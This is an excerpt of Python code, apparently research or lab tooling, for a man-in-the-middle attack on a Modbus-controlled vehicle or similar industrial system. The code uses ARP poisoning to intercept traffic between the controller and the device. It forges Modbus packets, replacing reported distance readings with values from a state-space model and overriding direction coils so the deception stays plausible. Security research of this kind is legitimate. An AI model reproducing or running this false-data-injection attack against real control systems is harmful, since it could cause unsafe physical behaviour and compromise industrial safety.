...
class parametricAttacker(object):
    def __init__(self):
        ## self.A=np.matrix(((0.8253,-0.001425),(0.9099,1)))
        self.A=np.matrix(((0.1295,0),(0.2129,1)))
        self.X=np.matrix(((0,),(0,)))
        ## self.B=np.matrix(((0.09099,),(0.04695,)))
        self.B=np.matrix(((0.2129,),(0.0702,)))
        ##self.C=np.matrix(((0,0.100)))
        self.C=np.matrix(((0,0.1986)))
        self.direction = None
        self.ymax = None
        self.ymin = None
        self.lastSpeed = 120
    ...
    def resetX(self):
        if(self.direction):
            self.X=np.matrix(((0,),(self.ymax/0.196,)))
        else:
            self.X=np.matrix(((0,),(self.ymin/0.196,)))


    def setYMax(self, newmax):
        self.ymax = newmax

    def setYMin(self, newmin):
        self.ymin = newmin
...
def printData(session,seq):
    slaveIp = session.carIP
    masterIp = session.controlIP
    lastSpeed = None
    lastDistance = None
    
    print("Printing data dump###########################################")
    for packet in seq[::-1]:
        if(packet[IP].src == slaveIp and packet.funcCode == 4):
            if not (lastSpeed == None): print("Distance: %s Speed: %s" % (packet.registerVal[1],lastSpeed))
...
def app_main():
    ...
    def attackThread():
        global cs, lv, av, guiVars, patt
        lv = LearningVector()
        av = AttackVector()
        patt = parametricAttacker()
        ...
        arpClear()
        guiVars.status = "IDLE"
        printData(cs,lv.forwardSeq)
        printData(cs,lv.backwardSeq)
    ...
    if not (cs.startRecording):
        if (cs.synced):
            ...
            if(cs.lastDirection is None): cs.lastDirection = packet.coilStatus[0]
                ...
                patt.setDirection(cs.lastDirection)
        return False
...
def handlePacketAttacking(pkt):
    global cs, lv, av, FUNC_CODE_PRINT, guiVars, patt
    cs.starttime = time.time() * 1000
    pkt_src = pkt[IP].src
    ...
    if not(av.controlling):
        ...
        if (pkt_funcCode == FUNC_READ_SR and pkt_src == cs.carIP):
            ...
            if(distance < 180 and distance > 50):
                av.controlling = True
                patt.direction = not patt.direction
                patt.resetX()
                cs.distanceAsked = False
                cs.directionASked = False
                print("========================= **ATTACKER INITIALIZIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
        elif(pkt_funcCode == FUNC_WRITE_SR and pkt_src == cs.controlIP):
            parametricAttackGetValue(pkt.registerValue)
        if cs.packetCount%2 == 0:
            poisonARP(1, False)
        return False
    ...
    if (pkt_src == cs.controlIP):
        if(pkt_funcCode == FUNC_WRITE_SR):
            patt.lastSpeed = pkt.registerValue
        ...
        if (pkt_funcCode == 4):
            ...
            newpkt.registerVal[1] = parametricAttackGetValue(patt.lastSpeed)
            print("Sending %s compared to: %s" % (newpkt.registerVal[1],oldval))
            pkt = forge(pkt,newpkt)
        elif(pkt_funcCode == 1):
            newpkt = lv.fullSeq[localcount]
            newpkt.coilStatus[0] = patt.direction
            pkt = forge(pkt,newpkt)
        else:
...
def parametricAttackGetValue(speed):
    global patt
    U=np.matrix(((speed,)))
    W=np.matrix(((random.random(),),(random.random(),))) #rand
    V=np.matrix(((random.random(),)))   #rand

    if(patt.direction):
        xaux=patt.A*patt.X-patt.B*U+W
        y=patt.C*xaux+V
    else:
        xaux=patt.A*patt.X+patt.B*U+W
        y=patt.C*xaux+V

    if(patt.alternate):patt.X = xaux
    patt.alternate = not patt.alternate

    distance = int(y)
    if(distance >= patt.ymax):
        patt.setDirection(True)
        patt.resetX()
        
    elif(distance <= patt.ymin):
        patt.setDirection(False)
        patt.resetX()
    print("Calculating distance: %s from speed: %s" % (distance,speed))
